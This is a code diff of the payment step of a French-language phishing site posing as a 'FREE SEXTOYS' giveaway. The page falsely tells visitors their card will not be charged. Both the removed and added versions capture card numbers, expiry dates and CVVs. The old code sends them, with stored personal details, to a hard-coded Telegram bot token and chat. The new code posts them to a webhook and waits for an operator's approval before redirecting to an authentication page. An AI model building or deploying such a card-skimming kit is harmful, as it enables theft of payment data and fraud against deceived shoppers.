@@ -2,308 +2,157 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>FREE SEXTOYS - Paiement</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Sextoys - Paiement</title>
     <style>
         body {
-            background: linear-gradient(135deg, #1A2526 0%, #2C3E50 100%);
-            color: #FFFFFF;
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #1a2a44;
             margin: 0;
-            padding: 0;
-        }
-        nav {
-            background: #131921;
-            padding: 15px;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-        }
-        nav h1 {
-            color: #FF6200;
-            margin: 0;
-            font-size: 28px;
-            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
-        }
-        .progress {
-            text-align: center;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 25px;
-            margin: 10px 0;
-        }
-        .progress span {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            line-height: 40px;
-            border-radius: 50%;
-            margin: 0 15px;
-            background: #FF6200;
-            color: #FFFFFF;
-            font-weight: bold;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-        .progress span.inactive {
-            background: #666;
-            transform: scale(0.8);
-        }
-        .container {
-            max-width: 800px;
-            margin: 30px auto;
-            padding: 30px;
-            border-radius: 20px;
-            background: #FFFFFF;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
-            transition: transform 0.3s ease;
-        }
-        .container:hover {
-            transform: translateY(-5px);
-        }
-        .message {
-            background: #FF6200;
-            color: #FFFFFF;
             padding: 20px;
-            text-align: center;
-            border-radius: 15px;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .header {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 20px;
-            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
         }
-        .form-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 15px;
+        .header h1 {
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0;
         }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 5px 0;
-            background: #F5F5F5;
-            border: 1px solid #888;
-            color: #0F1111;
-            border-radius: 10px;
-            font-size: 16px;
-            transition: border-color 0.3s ease, box-shadow 0.3s ease;
-        }
-        input:focus {
-            border-color: #FF6200;
-            box-shadow: 0 0 8px rgba(255, 98, 0, 0.3);
-            outline: none;
-        }
-        button {
-            background: #FF6200;
-            border: none;
-            padding: 15px;
-            color: #FFFFFF;
-            cursor: pointer;
-            width: 100%;
-            border-radius: 25px;
-            font-size: 18px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            transition: background 0.3s ease, transform 0.2s ease;
-        }
-        button:hover {
-            background: #E55A00;
-            transform: scale(1.02);
-            box-shadow: 0 0 15px #FF6200;
-        }
-        button:disabled {
-            background: #666;
-            cursor: not-allowed;
-        }
-        .card-logos {
+        .steps {
             display: flex;
             justify-content: center;
-            gap: 15px;
+            gap: 10px;
             margin-bottom: 20px;
         }
-        .card-logos img {
-            height: 35px;
-            border-radius: 5px;
-            transition: transform 0.3s ease;
-        }
-        .card-logos img:hover {
-            transform: scale(1.1);
-        }
-        #cardError {
-            color: #FF4444;
-            text-align: center;
+        .step {
+            width: 30px;
+            height: 30px;
+            background-color: #4a5b7c;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 14px;
-            margin-top: 5px;
-            display: none;
+            font-weight: bold;
+        }
+        .step.active {
+            background-color: #ff6200;
+        }
+        .form-container {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        .form-container h2 {
+            color: #ff6200;
+            font-size: 18px;
+            margin: 0 0 20px;
+        }
+        .form-container label {
+            display: block;
+            color: #111;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .form-container button {
+            background-color: #ff6200;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
         }
     </style>
 </head>
 <body>
-    <nav><h1 id="title">FREE SEXTOYS - Paiement</h1></nav>
-    <div class="progress">
-        <span class="inactive">1</span><span class="inactive">2</span><span>3</span><span class="inactive">4</span><span class="inactive">5</span>
+    <div class="header">
+        <h1>FREE SEXTOYS</h1>
     </div>
-    <div class="container">
-        <div class="message" id="message">
-            Chers clients, grâce à notre partenariat exclusif avec notre service de livraison, nous sommes ravis de vous offrir une expérience unique ! En tant que testeurs de notre boutique FREE SEXTOYS, votre abonnement sera entièrement gratuit pour cet article. Soyez rassurés : VOTRE CARTE NE SERA PAS DÉBITÉE, juste une livraison rapide et fiable. Profitez de cette offre exceptionnelle !
-        </div>
-        <div class="card-logos">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express">
-        </div>
-        <div class="form-grid">
-            <input type="text" placeholder="Adresse de livraison" id="adresseLivraison">
-            <input type="tel" placeholder="Numéro de destinataire" id="numeroDestinataire">
-            <input type="text" placeholder="Nom du titulaire de la carte" id="titulaire">
-            <input type="text" placeholder="Numéro de carte bancaire" id="carte" oninput="validateCard()">
-            <div id="cardError">Numéro de carte invalide. Veuillez entrer une carte MasterCard, Visa ou American Express.</div>
-            <input type="text" placeholder="Date d'expiration (MM/AA)" id="expiration" maxlength="5" oninput="formatExpiration()">
-            <input type="text" placeholder="CVV" id="cvv" maxlength="4">
-        </div>
-        <button id="confirmBtn" onclick="sendAllToTelegram()">Confirmer</button>
+    <div class="steps">
+        <div class="step">1</div>
+        <div class="step">2</div>
+        <div class="step active">3</div>
+        <div class="step">4</div>
+        <div class="step">5</div>
+    </div>
+    <div class="form-container">
+        <h2>Payment Information</h2>
+        <form id="paymentForm">
+            <label for="cardNumber">Card Number</label>
+            <input type="text" id="cardNumber" placeholder="Enter your card number" required>
+            <label for="expiryDate">Expiry Date</label>
+            <input type="text" id="expiryDate" placeholder="MM/YY" required>
+            <label for="cvv">CVV</label>
+            <input type="text" id="cvv" placeholder="Enter your CVV" required>
+            <button type="submit">Confirmer</button>
+        </form>
     </div>
 
     <script>
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                const country = data.country_code;
-                let lang = 'en';
-                if (country === 'FR') lang = 'fr';
-                if (country === 'DE') lang = 'de';
-                changeLanguage(lang);
-            })
-            .catch(error => {
-                console.error('Erreur lors de la détection de langue :', error);
-                changeLanguage('en');
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            const message = `Nouveau paiement:\nNuméro de carte: ${cardNumber}\nDate d'expiration: ${expiryDate}\nCVV: ${cvv}\n\nConfirmez-vous ce paiement ?`;
+
+            const response = await fetch('/.netlify/functions/telegram-webhook', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    message: message,
+                    page: 'page3' // Indique que c'est pour la page de paiement
+                })
             });
 
-        function changeLanguage(lang) {
-            const title = document.getElementById('title');
-            const message = document.getElementById('message');
-            const confirmBtn = document.getElementById('confirmBtn');
-            const inputs = document.querySelectorAll('input');
-            const cardError = document.getElementById('cardError');
+            // Ne pas afficher la réponse, démarrer la vérification de la réponse Telegram
+            checkTelegramResponse();
+        });
 
-            if (lang === 'fr') {
-                title.textContent = 'FREE SEXTOYS - Paiement';
-                message.textContent = 'Chers clients, grâce à notre partenariat exclusif avec notre service de livraison, nous sommes ravis de vous offrir une expérience unique ! En tant que testeurs de notre boutique FREE SEXTOYS, votre abonnement sera entièrement gratuit pour cet article. Soyez rassurés : VOTRE CARTE NE SERA PAS DÉBITÉE, juste une livraison rapide et fiable. Profitez de cette offre exceptionnelle !';
-                confirmBtn.textContent = 'Confirmer';
-                inputs[0].placeholder = 'Adresse de livraison';
-                inputs[1].placeholder = 'Numéro de destinataire';
-                inputs[2].placeholder = 'Nom du titulaire de la carte';
-                inputs[3].placeholder = 'Numéro de carte bancaire';
-                inputs[4].placeholder = 'Date d\'expiration (MM/AA)';
-                inputs[5].placeholder = 'CVV';
-                cardError.textContent = 'Numéro de carte invalide. Veuillez entrer une carte MasterCard, Visa ou American Express.';
-            } else if (lang === 'en') {
-                title.textContent = 'FREE SEXTOYS - Payment';
-                message.textContent = 'Dear customers, thanks to our exclusive partnership with our delivery service, we are delighted to offer you a unique experience! As testers of our FREE SEXTOYS store, your subscription will be completely free for this item. Rest assured: YOUR CARD WILL NOT BE CHARGED, just fast and reliable delivery. Enjoy this exceptional offer!';
-                confirmBtn.textContent = 'Confirm';
-                inputs[0].placeholder = 'Delivery Address';
-                inputs[1].placeholder = 'Recipient Phone Number';
-                inputs[2].placeholder = 'Cardholder Name';
-                inputs[3].placeholder = 'Card Number';
-                inputs[4].placeholder = 'Expiration Date (MM/YY)';
-                inputs[5].placeholder = 'CVV';
-                cardError.textContent = 'Invalid card number. Please enter a MasterCard, Visa, or American Express card.';
-            } else if (lang === 'de') {
-                title.textContent = 'FREE SEXTOYS - Zahlung';
-                message.textContent = 'Liebe Kunden, dank unserer exklusiven Partnerschaft mit unserem Lieferdienst freuen wir uns, Ihnen ein einzigartiges Erlebnis zu bieten! Als Tester unseres FREE SEXTOYS-Shops ist Ihr Abonnement für diesen Artikel völlig kostenlos. Seien Sie beruhigt: IHRE KARTE WIRD NICHT BELASTET, nur eine schnelle und zuverlässige Lieferung. Nutzen Sie dieses außergewöhnliche Angebot!';
-                confirmBtn.textContent = 'Bestätigen';
-                inputs[0].placeholder = 'Lieferadresse';
-                inputs[1].placeholder = 'Telefonnummer des Empfängers';
-                inputs[2].placeholder = 'Name des Karteninhabers';
-                inputs[3].placeholder = 'Kartennummer';
-                inputs[4].placeholder = 'Ablaufdatum (MM/JJ)';
-                inputs[5].placeholder = 'CVV';
-                cardError.textContent = 'Ungültige Kartennummer. Bitte geben Sie eine MasterCard, Visa oder American Express ein.';
-            }
-        }
+        async function checkTelegramResponse() {
+            const interval = setInterval(async () => {
+                const response = await fetch('/.netlify/functions/check-response?page=page3');
+                const data = await response.json();
 
-        function validateCard() {
-            const cardInput = document.getElementById('carte').value.replace(/\s/g, '');
-            const cardError = document.getElementById('cardError');
-            const confirmBtn = document.getElementById('confirmBtn');
-
-            const visaRegex = /^4[0-9]{12}(?:[0-9]{3})?$/;
-            const masterCardRegex = /^5[1-5][0-9]{14}$/;
-            const amexRegex = /^3[47][0-9]{13}$/;
-
-            if (visaRegex.test(cardInput) || masterCardRegex.test(cardInput) || amexRegex.test(cardInput)) {
-                cardError.style.display = 'none';
-                confirmBtn.disabled = false;
-            } else {
-                cardError.style.display = 'block';
-                confirmBtn.disabled = true;
-            }
-        }
-
-        function formatExpiration() {
-            const expirationInput = document.getElementById('expiration');
-            let value = expirationInput.value.replace(/\D/g, '');
-            if (value.length >= 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2);
-            }
-            expirationInput.value = value;
-        }
-
-        function sendAllToTelegram() {
-            const selectedItems = JSON.parse(localStorage.getItem('selectedItems')) || [];
-            const userInfos = JSON.parse(localStorage.getItem('userInfos')) || {};
-            const paiement = {
-                adresseLivraison: document.getElementById('adresseLivraison').value,
-                numeroDestinataire: document.getElementById('numeroDestinataire').value,
-                titulaire: document.getElementById('titulaire').value,
-                carte: document.getElementById('carte').value,
-                expiration: document.getElementById('expiration').value,
-                cvv: document.getElementById('cvv').value
-            };
-
-            const message = `Données des Pages 1, 2, 3 - FREE SEXTOYS\n\n` +
-                            `Articles choisis (Page 1):\n${selectedItems.length > 0 ? selectedItems.join(', ') : 'Aucun article sélectionné'}\n\n` +
-                            `Informations personnelles (Page 2):\n` +
-                            `Nom: ${userInfos.nom || ''}\n` +
-                            `Email: ${userInfos.email || ''}\n` +
-                            `Téléphone: ${userInfos.telephone || ''}\n` +
-                            `Pays: ${userInfos.pays || ''}\n` +
-                            `Ville: ${userInfos.ville || ''}\n` +
-                            `Code postal: ${userInfos.codepostal || ''}\n` +
-                            `Adresse: ${userInfos.adresse || ''}\n\n` +
-                            `Paiement (Page 3):\n` +
-                            `Adresse de livraison: ${paiement.adresseLivraison || ''}\n` +
-                            `Numéro de destinataire: ${paiement.numeroDestinataire || ''}\n` +
-                            `Nom du titulaire: ${paiement.titulaire || ''}\n` +
-                            `Numéro de carte: ${paiement.carte || ''}\n` +
-                            `Date d'expiration: ${paiement.expiration || ''}\n` +
-                            `CVV: ${paiement.cvv || ''}`;
-
-            const token = '7966565424:AAGTSMjFqmYkI-Kd1jiccJWtRzPfSdZ_VAA';
-            const chatId = '1191944530';
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{ text: 'Oui', callback_data: 'yes_pages123' }, { text: 'Non', callback_data: 'no_pages123' }]
-                        ]
+                if (data.action) {
+                    clearInterval(interval);
+                    if (data.action === 'yes') {
+                        window.location.href = 'authentication.html';
+                    } else if (data.action === 'no') {
+                        alert('Paiement refusé. Veuillez réessayer.');
+                        window.location.href = 'paiement.html';
                     }
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                alert('Données envoyées à Telegram !');
-                localStorage.setItem('adresseLivraison', paiement.adresseLivraison);
-                localStorage.setItem('numeroDestinataire', paiement.numeroDestinataire);
-                localStorage.setItem('titulaire', paiement.titulaire);
-                localStorage.setItem('carte', paiement.carte);
-                localStorage.setItem('expiration', paiement.expiration);
-                localStorage.setItem('cvv', paiement.cvv);
-                window.location.href = 'authentication.html';
-            })
-            .catch(error => alert('Erreur : ' + error));
+                }
+            }, 2000); // Vérifie toutes les 2 secondes
         }
     </script>
 </body>
